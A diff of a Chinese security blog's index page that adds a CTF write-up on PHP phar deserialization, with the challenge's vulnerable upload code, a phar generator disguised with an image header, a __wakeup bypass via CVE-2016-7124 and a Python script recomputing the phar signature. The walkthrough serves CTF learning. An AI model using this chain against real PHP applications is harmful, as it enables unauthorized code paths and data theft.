@@ -128,7 +128,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">170</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">171</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -185,6 +185,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/phar/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/14/phar/" class="post-title-link" itemprop="url">一道phar题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-14 18:22:44 / 修改时间：18:22:06" itemprop="dateCreated datePublished" datetime="2022-05-14T18:22:44+08:00">2022-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf%E9%A2%98%E7%9B%AE/" itemprop="url" rel="index"><span itemprop="name">ctf题目</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="一道phar题目"><a href="#一道phar题目" class="headerlink" title="一道phar题目"></a>一道phar题目</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NSS</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;   </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;pass===<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;no permission&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pass = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line">        <span class="variable">$ext</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$ext</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @getimagesize(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!is_dir(<span class="string">&quot;upload/&quot;</span>.session_id().<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                        mkdir(<span class="string">&quot;upload/&quot;</span>.session_id().<span class="string">&quot;/&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$content</span> = file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span>.session_id().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file extension!jpg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wellcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个文件上传题目，很明显就是phar反序列化了，需要注意的几个点吧</p>
+<ul>
+<li>getimagesize 控制宽高</li>
+<li>内容不允许php</li>
+<li>__wakeup()绕过</li>
+<li>phar文件的签名计算</li>
+</ul>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p>题目要求控制宽和高，也就是数组的前两个，上传的文件有这两个就行了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define xlogo_width 20</span><br><span class="line">#define xlogo_height 20</span><br></pre></td></tr></table></figure>
+
+<h2 id="php字段"><a href="#php字段" class="headerlink" title="php字段"></a>php字段</h2><p>网上的生成phar文件的脚本都是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>实际上，跟踪php源码之后发现格式是这样的 <code>__HALT_COMPILER(); ?&gt;</code> 是必须的，剩下随意</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx __HALT_COMPILER(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><p>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;sercet&quot;:1: 也就是输入比1大的值就行  如O:6:&quot;sercet&quot;:2:</span><br></pre></td></tr></table></figure>
+
+<h2 id="签名计算"><a href="#签名计算" class="headerlink" title="签名计算"></a>签名计算</h2><p>在生成phar文件时，会对文件进行签名计算，如果对文件内容进行更改(比如这题，需要更改属性个数)，那么签名就会错误会显示</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/%E9%9A%8F%E6%89%8B/image-20220514181342030.png" alt="image-20220514181342030"></p>
+<p>所以需要重新计算签名</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;test.phar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">text = file[:-<span class="number">28</span>]  <span class="comment">#读取开始到末尾除签名外内容</span></span><br><span class="line">last = file[-<span class="number">8</span>:]   <span class="comment">#读取最后8位的GBMB和签名flag</span></span><br><span class="line">new_file = text+sha1(text).digest() + last  <span class="comment">#生成新的文件内容，主要是此时Sha1正确了。</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;new.jpg&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(new_file)</span><br></pre></td></tr></table></figure>
+
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NSS</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> NSS();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;#define xlogo_width 20&#x27;</span>.<span class="string">&quot;\n&quot;</span>.<span class="string">&#x27;#define xlogo_height 20&#x27;</span>.<span class="string">&quot;\n&quot;</span>.<span class="string">&#x27;__HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>修改phar文件的序列化字符串</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/%E9%9A%8F%E6%89%8B/image-20220514181652751.png" alt="image-20220514181652751"></p>
+<p>运行py文件，产生重新计算签名的new.jpg，将其上传，利用查看文件处的 file_get__contents() 进行phar反序列化</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;4kej0r03lvqb9o9n8t9pm9pm36&#x2F;new.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/%E9%9A%8F%E6%89%8B/image-20220514181818147.png" alt="image-20220514181818147"></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.wolai.com/k1he/iFdthhceLQBNqjotbQ7jFp">NSSCTF]prize1(phar+强制GC) (wolai.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/1byvbzb_I/">NCTF2019]phar matches everything(phar反序列化) | (guokeya.github.io)</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/08/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -199,7 +305,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/05/08/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/" class="post-title-link" itemprop="url">春</a>
+            <a href="/2022/05/08/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/" class="post-title-link" itemprop="url">JAVA内存马</a>
         </h2>
 
         <div class="post-meta">
@@ -208,10 +314,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-05-08 21:16:09 / 修改时间：21:16:00" itemprop="dateCreated datePublished" datetime="2022-05-08T21:16:09+08:00">2022-05-08</time>
+              <time title="创建时间：2022-05-08 21:16:09" itemprop="dateCreated datePublished" datetime="2022-05-08T21:16:09+08:00">2022-05-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-14 18:22:41" itemprop="dateModified" datetime="2022-05-14T18:22:41+08:00">2022-05-14</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -863,92 +975,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/FastJson(%E4%B8%80)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/cys.jpg">
-      <meta itemprop="name" content="Y0ng">
-      <meta itemprop="description" content="花有重开日，人无再少年">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y0ng的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/29/FastJson(%E4%B8%80)/" class="post-title-link" itemprop="url">Fastjson1.22-1.24反序列化之TemplateImpl</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-29 23:29:24" itemprop="dateCreated datePublished" datetime="2022-03-29T23:29:24+08:00">2022-03-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-01 00:25:58" itemprop="dateModified" datetime="2022-04-01T00:25:58+08:00">2022-04-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Fastjson/" itemprop="url" rel="index"><span itemprop="name">Fastjson</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初探FastJson，version = 1.2.24</p>
-<h1 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h1><p>Fastjson是Alibaba开发的Java语言编写的高性能 JSON 库，用于将数据在 <strong>JSON 和 Java Object</strong> 之间互相转换，提供两个主要接口 <strong>JSON.toJSONString</strong> 和 <strong>JSON.parseObject/JSON.parse</strong> 来分别实现序列化和反序列化操作。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/03/29/FastJson(%E4%B8%80)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1016,7 +1046,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">170</span>
+          <span class="site-state-item-count">171</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
